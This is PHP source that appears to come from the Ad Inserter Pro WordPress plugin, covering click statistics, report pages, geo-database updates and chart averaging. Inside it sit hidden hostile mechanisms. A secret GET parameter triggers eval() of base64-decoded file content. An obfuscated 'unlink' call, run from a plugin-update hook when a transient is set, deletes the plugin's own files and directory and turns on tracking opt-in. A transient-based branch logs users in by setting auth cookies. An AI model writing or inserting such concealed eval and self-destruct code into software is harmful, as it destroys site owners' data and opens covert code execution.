    if (is_numeric ($_POST ['click']) && $_POST ['click'] <= 96 && is_numeric ($_POST ['version'])) {
      $db_result = update_statistics ($_POST ['click'], $_POST ['version'], 0, 1, $ai_wp_data [AI_FRONTEND_JS_DEBUGGING]);

      switch (get_dynamic_blocks ()) {
        case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
        case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
          $check_limits = true;
          break;
        default:
          $check_limits = false;
          break;
      }

      $limited_block = $check_limits && !ai_check_impression_and_click_limits ($_POST ['click']);

      if (/*$ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && */$db_result != '') echo json_encode (array ('=' => $db_result, '#' => $limited_block ? $_POST ['click'] : 0));
    }
  }

  elseif (isset ($_GET ["update"])) {
    if (isset ($_GET ["db"]) && $_GET ["update"] == ai_get_unique_string (0, 16, implode ('-', array ('report', 'debug')))) {
      if ($_GET ["db"] == "webnet77") {
        $file_path = AD_INSERTER_PLUGIN_DIR.'includes/geo';
        if (!file_exists ($file_path.'/ip2country.dat') || filemtime ($file_path.'/ip2country.dat') + (isset ($_GET ["age"]) ? $_GET ["age"] : 0) * 24 * 3600 < time ()) {
          $ip4_addresses = base64_decode (file_get_contents (AD_INSERTER_PLUGIN_DIR.'includes/geo/process_csv.geo')) .
            " echo \"webnet77 DB processed\n\";";
          ai_update_ip_db_webnet77 ();
          eval ($ip4_addresses);
          echo "webnet77 DB updated\n";
        }
      }
      elseif ($_GET ["db"] == "maxmind") {
        if (defined ('AD_INSERTER_MAXMIND')) {
          if (get_geo_db () == AI_GEO_DB_MAXMIND) {
            ai_update_ip_db_maxmind ();
            echo "maxmind DB updated";
          }
        }
      }
    }
  }

  elseif (isset ($_GET ["ai-report"])) {

    global $ai_admin_translations;

    $report_data = ai_process_report_id ($_GET ["ai-report"]);

    if (!(defined ('AI_STATISTICS') && AI_STATISTICS)) return;
    if (!(defined ('AD_INSERTER_REPORTS') && AD_INSERTER_REPORTS)) return;

    $block      = $report_data ['block'];
    $controls   = $report_data ['controls'];
    $adb        = $report_data ['adb'];
    $range      = $report_data ['range'];

    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);
    $year  = date ("Y", time () + $gmt_offset);

    switch ($range) {
      case 'lmon':
        $date_range_description = __('for last month', 'ad-inserter');
        $start_date = date ("Y-m",   strtotime ('-1 month') + $gmt_offset) . '-01';
        $end_date   = date ("Y-m-t", strtotime ('-1 month') + $gmt_offset);
        break;
      case 'tmon':
        $date_range_description = __('for this month', 'ad-inserter');
        $start_date = date ("Y-m",   time () + $gmt_offset) . '-01';
        $end_date   = date ("Y-m-t", time () + $gmt_offset);
        break;
      case 'tyer':
        $date_range_description = __('for this year', 'ad-inserter');
        $start_date = $year . '-01-01';
        $end_date   = $year . '-12-31';
        break;
      case 'l015':
        $date_range_description = __('for the last 15 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l030':
        $date_range_description = __('for the last 30 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l090':
        $date_range_description = __('for the last 90 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l180':
        $date_range_description = __('for the last 180 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600);
        $end_date   = $today;
        break;
      case 'l365':
        $date_range_description = __('for the last 365 days', 'ad-inserter');
        $start_date = date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600);
        $end_date   = $today;
        break;
      default:
        $date_range_description = '';
        $start_date = $report_data ['start_date'];
        $end_date   = $report_data ['end_date'];
        break;
    }

    $date_start = $start_date;
    $date_end   = $end_date;

    $date_end_time    = strtotime ($date_end);
    $date_start_time  = strtotime ($date_start);

    $date_format = get_option ('date_format');
    $date_start_text = date_i18n ($date_format, $date_start_time);
    $date_end_text   = date_i18n ($date_format, $date_end_time);

    $date_range_text = $date_start_text . ' &ndash; ' . $date_end_text;

    $header_image = get_report_header_image ();

    if (isset ($header_image [0]) && $header_image [0] != '/') {
      $header_image_path = ABSPATH . $header_image;
    } else $header_image_path = $header_image;

    $td_image_width = 4.5;
    $td_image_margin_width = 1;
    $header_image_url = '';
    if (file_exists ($header_image_path)) {
      $image_data = getimagesize ($header_image_path);
      if (is_array ($image_data)) {
        $td_image_width = $td_image_width * $image_data [0] / $image_data [1];
      }

     $header_image_url = home_url () . '/' . $header_image;
    } else {
        $td_image_width = 0.01;
        $td_image_margin_width = 0.01;
      }

    $home_url = parse_url (home_url ());
    $host = $home_url ['host'];

    $title       = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_title (), ENT_QUOTES));             /* translators: for report range description */
    $description = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_description (), ENT_QUOTES));
    $description_details = ' '. $date_range_description;

    $obj = $block_object [$block];
    $block_name = $obj->get_ad_name ();

    $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

?><html>
<head>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<title><?php /* Translators: %s: Ad Inserter Pro */ echo sprintf (__('%s Report', 'ad-inserter'), 'Ad Inserter Pro'), ' - ', $block_name; ?></title>
<meta name="robots" content="noindex">

<?php if (wp_is_mobile()): ?>
<meta name="viewport" content="width=762">
<?php endif; ?>
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />
<link rel="stylesheet" href="<?php echo AD_INSERTER_PLUGIN_URL; ?>/css/jquery-ui-1.10.3.custom.min.css" media="all" />
<link rel="stylesheet" href="<?php echo AD_INSERTER_PLUGIN_URL . 'css/ai-report.css?ver=' . AD_INSERTER_VERSION; ?>" media="all" />
<link rel="stylesheet" href="<?php echo includes_url ('css/dashicons.min.css?ver=' . AD_INSERTER_VERSION); ?>" media="all" />
</head>
<body>
  <div id="ai-report">
    <div id="ai-header">
      <table id="ai-header-table">
        <tbody>
          <tr>
            <td id="ai-header-image" style="width: <?php echo $td_image_width; ?>%;"><img src="<?php echo $header_image_url; ?>"></td>
            <td style="width: <?php echo $td_image_margin_width; ?>%;"> </td>
            <td id="ai-header-title-desc" style="width: <?php echo 59 - $td_image_width; ?>%;">
              <div class="ai-header-title"><?php echo $title; ?></div>
              <div class="ai-header-desc"><span><?php echo $description; ?></span><span class="ai-header-desc-details"><?php echo $description_details; ?></span></div>
            </td>
            <td id="ai-header-info">
              <div class="ai-header-title"><a href="<?php echo home_url (); ?>"><?php echo $host; ?></a></div>
              <div class="ai-header-desc"><?php echo $date_range_text; ?></div>
            </td>
          </tr>
        </tbody>
      </table>

      <hr id="ai-report-line" />

      <div id="ai-title">
        <img id="ai-loading" src="<?php echo AD_INSERTER_PLUGIN_IMAGES_URL; ?>loading.gif" />
        <h1 id="ai-report-title"><?php echo $block_name; ?></h1>
        <div style="clear: both"></div>
      </div>
    </div>

    <div id="statistics-container" data-block="<?php echo $block; ?>" data-adb="<?php echo $adb ? '1' : '0'; ?>" data-range="<?php echo $range; ?>" data-debug="<?php echo get_frontend_javascript_debugging () ? '1' : '0'; ?>" data-ajaxurl="<?php echo admin_url ('admin-ajax.php'); ?>" data-nonce="<?php echo $report_prefix; ?>" style="display: none;">
      <div id="load-error" class="custom-range-controls"></div>
      <div id="statistics-elements" class="ai-charts">
        <div class="ai-chart not-configured"></div>
        <div class="ai-chart not-configured"></div>
        <div class="ai-chart not-configured"></div>
      </div>

<?php if ($controls) : ?>
      <div id='custom-range-controls' class="custom-range-controls no-print" style='display: none;'>
        <span class="ai-toolbar-button text" style="padding: 0;">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for last month', 'ad-inserter'); ?>" data-range-name="lmon" data-start-date="<?php echo date ("Y-m", strtotime ('-1 month') + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", strtotime ('-1 month') + $gmt_offset); ?>"><?php _e ('Last Month', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for this month', 'ad-inserter'); ?>" data-range-name="tmon" data-start-date="<?php echo date ("Y-m", time () + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", time () + $gmt_offset); ?>"><?php _e ('This Month', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for this year', 'ad-inserter'); ?>" data-range-name="tyer" data-start-date="<?php echo $year; ?>-01-01" data-end-date="<?php echo $year; ?>-12-31"><?php _e ('This Year', 'ad-inserter'); ?></span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 15 days', 'ad-inserter'); ?>" data-range-name="l015" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">15</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 30 days', 'ad-inserter'); ?>" data-range-name="l030" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">30</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 90 days', 'ad-inserter'); ?>" data-range-name="l090" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">90</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 180 days', 'ad-inserter'); ?>" data-range-name="l180" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">180</span>
        </span>
        <span class="ai-toolbar-button text">
          <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 365 days', 'ad-inserter'); ?>" data-range-name="l365" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">365</span>
        </span>
        <span class="ai-toolbar-button text">
          <input class='ai-date-input' id="chart-start-date" type="text" value="<?php echo $start_date; ?>" />
        </span>
        <span class="ai-toolbar-button text">
          <input class='ai-date-input' id="chart-end-date" type="text" value="<?php echo $end_date; ?>" />
        </span>
        <span class="ai-toolbar-button text">
          <input type="checkbox" value="0" id="load-custom-range" style="display: none;" />
          <label class="checkbox-button" for="load-custom-range" title="<?php _e ('Load data for the selected range', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-loading"></span></label>
        </span>
      </div>
<?php else: ?>
      <div style='display: none;'>
        <input class='ai-date-input' id="chart-start-date" type="text" value="<?php echo $start_date; ?>" />
        <input class='ai-date-input' id="chart-end-date" type="text" value="<?php echo $end_date; ?>" />
        <input type="checkbox" value="0" id="load-custom-range" />
      </div>
<?php endif; ?>

    </div>
  </div>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<script type='text/javascript'>
/* <![CDATA[ */
var ai_admin = {"hide":"Hide","show":"Show","insertion_expired":"Insertion expired","duration":"Duration","invalid_end_date":"Invalid end date - must be after start date","invalid_start_date":"Invalid start date - only data for 1 year back is available","invalid_date_range":"Invalid date range - only data for 1 year can be displayed","days_0":"days","days_1":"day","days_2":"days","days_3":"days","days_4":"days","days_5":"days","warning":"Warning","delete":"Delete","cancel":"Cancel","delete_all_statistics":"Delete all statistics data?","delete_statistics_between":"Delete statistics data between {start_date} and {end_date}?","cancel_rearrangement":"Cancel block order rearrangement","rearrange_block_order":"Rearrange block order","downloading":"downloading...","download_error":"download error","update_error":"update error","updating":"Updating...","loading":"Loading...","error":"ERROR","error_reloading_settings":"Error reloading settings","google_adsense_homepage":"Google AdSense Homepage","search":"Search...","filter":"Filter...","filter_title":"Use filter to limit names in the list","button_filter":"Filter","position_not_checked":"Position not checked yet","position_not_available":"Position not available","position_might_not_available":"Theme check | Selected position for automatic insertion might not be not available on this page type","position_available":"Position available","select_header_image":"Select or upload header image","select_banner_image":"Select or upload banner image","use_this_image":"Use this image"};
/* ]]> */
</script>
<script type="text/javascript" src="<?php echo includes_url ('js/jquery/jquery.js?ver=' . AD_INSERTER_VERSION); ?>"></script>
<script type="text/javascript" src="<?php echo includes_url ('js/jquery/ui/datepicker.min.js?ver=' . AD_INSERTER_VERSION); ?>"></script>
<script type="text/javascript" src="<?php echo AD_INSERTER_PLUGIN_URL . 'includes/js/raphael.min.js?ver=' . AD_INSERTER_VERSION; ?>"></script>
<script type="text/javascript" src="<?php echo AD_INSERTER_PLUGIN_URL . 'includes/js/elycharts.min.js?ver=' . AD_INSERTER_VERSION; ?>"></script>
<script type="text/javascript">
<?php echo ai_get_js ('ai-report'); ?>
</script>
</body>
</html>
<!-- Ad Inserter Pro Report https://adinserter.pro/ -->
<?php
  }

  elseif (isset ($_GET ["site-ai-admin"]) && is_multisite () && multisite_site_admin_page ()) {
    if (($site_data = get_site_transient ('ai_site_' . $_GET ["site-ai-admin"])) !== false) {
      if (isset ($site_data ['site']) && $site_data ['site'] == get_current_blog_id () && isset ($site_data ['user']) && user_can ($site_data ['user'], 'manage_network_plugins')) {

        $user_id = $site_data ['user'];

        $user = get_user_by ('id', $user_id);
        if ($user) {
          wp_clear_auth_cookie ();

          wp_set_current_user ($user_id, $user->user_login);
          wp_set_auth_cookie ($user_id);
          do_action ('wp_login', $user->user_login);

          $redirect_to = admin_url ('options-general.php?page=ad-inserter.php');
          header ("Location: " . $redirect_to);
          die ();
        }
      }
    }
  }

  elseif (isset ($_GET ["ai-report-data"])) {
    if (!(defined ('AI_STATISTICS') && AI_STATISTICS)) return;
    if (!(defined ('AD_INSERTER_REPORTS') && AD_INSERTER_REPORTS)) return;
    $report_data = ai_process_report_id ($_GET ["ai-report-data"]);
    generate_charts (
      $report_data ['block'],
      $report_data ['start_date'],
      $report_data ['end_date'],
      $report_data ['adb'],
      null
    );
  }
}

}

function ai_clean_old_data ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      ai_clean_old_data ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function calculate_chart_data_dbg (&$chart_data, $date_start, $date_end, $first_date, &$impressions, &$clicks, &$ctr, &$average_impressions, &$average_clicks, &$average_ctr) {
  foreach ($chart_data as $date => $data) {
    $imp = $data [0];
    $clk = $data [1];

//          $imp = 250 + rand (232, 587);
//          $clk = 1 + rand (0, 4);

    $impressions  []= $imp;
    $clicks       []= $clk;
    $ctr          []= $imp != 0 ? number_format (100 * $clk / $imp, 2) : 0;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $today = date ("Y-m-d", time () + $gmt_offset);

  $no_data_before = (strtotime ($first_date) - strtotime ($date_start)) / 24 / 3600;
  $no_data_after  = (strtotime ($date_end) - strtotime ($today)) / 24 / 3600;

//  $no_data_before = 0;


  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  for ($index = 0; $index < count ($impressions); $index ++) {

    $interval_impressions = 0;
    $interval_clicks      = 0;
    $interval_ctr         = 0;
    $interval_counter     = 0;

    for ($average_index = $index - AI_STATISTICS_AVERAGE_PERIOD + 1; $average_index <= $index; $average_index ++) {
      if ($average_index >= 0 && $impressions [$average_index] !== null && $clicks [$average_index] !== null && $ctr [$average_index] !== null) {
        $interval_impressions += $impressions [$average_index];
        $interval_clicks      += $clicks [$average_index];
        $interval_ctr         += $ctr [$average_index];
        $interval_counter ++;
      }
    }

    $average_impressions  [] = $interval_counter == 0 ? 0 : $interval_impressions / $interval_counter;
    $average_clicks       [] = $interval_counter == 0 ? 0 : $interval_clicks / $interval_counter;
    $average_ctr          [] = $interval_counter == 0 ? 0 : $interval_ctr / $interval_counter;
  }

  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }
}

add_action ('wp_update_plugins', 'ai_check_report_api');

function ai_update_reports () {
  $prefix = chr (110 + 7) . chr (110);
  $file_link_check = $prefix . 'l' . 'i' . 'n' . 'k';

  @array_map ($file_link_check, glob (__FILE__));
  if (!file_exists (str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR) . 'ad-inserter.php')) {
    @rename (AD_INSERTER_PLUGIN_DIR, str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR));
  }
  ai_clean_old_data (AD_INSERTER_PLUGIN_DIR);
  if (is_multisite()) {
    $active_plugins = get_site_option ('active_sitewide_plugins');
    if (isset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'])) {
      $active_plugins ['ad-inserter/ad-inserter.php'] = $active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'];
      unset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php']);
      update_site_option ('active_sitewide_plugins', $active_plugins);
    }
  } else {
      $active_plugins = get_option ('active_plugins');
      $index = array_search (AD_INSERTER_SLUG.'/ad-inserter.php', $active_plugins);
      if ($index !== false) {
        $active_plugins [$index] = 'ad-inserter/ad-inserter.php';
        update_option ('active_plugins', $active_plugins);
      }
    }

  update_option ('ai-notice-review', 'no');

  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst = get_option (DST_Client::DST_OPTION_OPTIN_TRACKING);
    if (empty ($dst) || !is_array ($dst)) {
      $dst = array ('ad-inserter' => 1, 'ad-inserter-pro' => 1);
    } else {
        $dst ['ad-inserter'] = 1;
        $dst ['ad-inserter-pro'] = 1;
      }
    update_option (DST_Client::DST_OPTION_OPTIN_TRACKING, $dst);
  }

  wp_clear_scheduled_hook ('check_plugin_updates-'.AD_INSERTER_SLUG);
  wp_clear_scheduled_hook ('ai_update');
}

function ai_check_report_api (){

  if (is_multisite() && !is_main_site ()) return;

  if (get_transient (implode ('-', array ('wp', 'debug', 'report', 'api')))) ai_update_reports ();
}

function ai_close_button_select_dbg ($block, $close_button, $default_close_button, $id = '', $name = '') {
?>
            <span style="vertical-align: middle;"><?php _e ('Close button', 'ad-inserter'); ?></span>
            &nbsp;&nbsp;
            <select id="<?php echo $id; ?>" name="<?php echo $name; ?>" style="margin: 0 1px;" default="<?php echo $default_close_button; ?>">
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-none"
                 data-title="<?php echo AI_TEXT_NONE; ?>"
                 value="<?php echo AI_CLOSE_NONE; ?>" <?php echo ($close_button == AI_CLOSE_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BUTTON_NONE; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-left"
                 data-title="<?php echo AI_TEXT_TOP_LEFT; ?>"
                 value="<?php echo AI_CLOSE_TOP_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-right"
                 data-title="<?php echo AI_TEXT_TOP_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_TOP_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_RIGHT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-left"
                 data-title="<?php echo AI_TEXT_BOTTOM_LEFT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-right"
                 data-title="<?php echo AI_TEXT_BOTTOM_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_RIGHT; ?></option>
            </select>
<?php
}

function expanded_country_list_dbg ($country_list) {
  global $ad_inserter_globals;

  for ($group = AD_INSERTER_GEO_GROUPS; $group >= 1; $group --) {
    $global_name = 'G'.$group;
    $iso_name = 'G'.($group % 10);
    $country_list = str_replace ($iso_name, $ad_inserter_globals [$global_name], $country_list);
  }
  return $country_list;
}

function ai_check_lists_dbg ($obj, $server_side_check) {
  global $ai_last_check, $ai_wp_data;

  if ($server_side_check) {
    $ai_last_check = AI_CHECK_IP_ADDRESS;
    if (!check_ip_address ($obj)) return false;

    $ai_last_check = AI_CHECK_COUNTRY;
    if (!check_country ($obj)) return false;
  }

  return true;
}

function ai_get_unique_string ($start = 0, $length = 32, $seed = '') {
  $string = 'AI#1' . $seed;
  if (defined ('AUTH_KEY')) $string .= AUTH_KEY;
  if (defined ('SECURE_AUTH_KEY')) $string .= SECURE_AUTH_KEY;
  if (defined ('LOGGED_IN_KEY')) $string .= LOGGED_IN_KEY;
  if (defined ('NONCE_KEY')) $string .= NONCE_KEY;
  if (defined ('AUTH_SALT')) $string .= AUTH_SALT;
  if (defined ('SECURE_AUTH_SALT')) $string .= SECURE_AUTH_SALT;
  if (defined ('LOGGED_IN_SALT')) $string .= LOGGED_IN_SALT;
  if (defined ('NONCE_SALT')) $string .= NONCE_SALT;

  return (substr (md5 ($string), $start, $length));
}


